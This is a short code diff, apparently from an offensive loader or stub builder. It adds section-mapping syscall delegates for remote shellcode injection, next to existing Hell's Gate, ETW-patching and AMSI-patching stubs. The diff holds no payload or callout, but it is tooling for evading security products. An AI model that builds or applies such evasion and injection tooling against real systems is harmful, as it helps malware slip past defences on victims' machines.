@@ -1727,6 +1727,9 @@ if(hellsgate):
     stub.add(HellsgateProtectDelegate)
     stub.add(HellsgateWriteDelegate)
     stub.add(HellsgateNtCloseDelegate)
+    if(remoteMapSection):
+        stub.add(HellsgateNtMapViewOfSectionDelegate)
+        stub.add(HellsgateNtCreateSectionDelegate)
     if (peload and (not localinject)):
         stub.add(HellsgateNtCreateThreadExDelegate)
     elif(localCreateThread or remoteETWpatch or remoteAMSIpatch):
@@ -1903,6 +1906,9 @@ if (shellcode):
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
+            if(remoteMapSection):
+                stub.add(NtCreateSectionDelegate)
+                stub.add(NtMapViewOfSectionDelegate)
             stub.add(RemoteInjectDelegates)
             stub.add(getRandStub())
             if (processname == ""):
